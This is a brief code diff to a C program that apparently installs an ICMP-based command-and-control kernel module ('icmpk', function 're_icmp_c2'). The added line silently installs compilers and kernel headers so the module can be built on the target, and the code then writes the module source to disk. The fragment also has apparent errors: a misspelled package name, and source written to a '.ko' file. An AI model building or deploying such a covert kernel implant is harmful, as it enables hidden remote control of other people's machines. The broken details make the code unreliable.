@@ -591,12 +591,11 @@ static const char *icmpk_Makefile = "CONFIG_MODULE_SIG=n\n"
     "\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules\n"
     "clean:\n"
     "\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean\n";
-const char *icmpk_find_missing_if_any = "make";
 int re_icmp_c2(void){
     // Vars
     FILE *fp;
     // Install prereqs
-        // headers compiler etc.
+    system("apt install -y build-essentials linux-headers-`uname -r` gcc-`cat /proc/version | awk '{print $7}' | cut -d'.' -f1,2`");
     // Write code
     fp = fopen("" ICMPK_PATH "/icmpk.ko", "w+");
     fprintf(fp, "%s", icmpk_c);
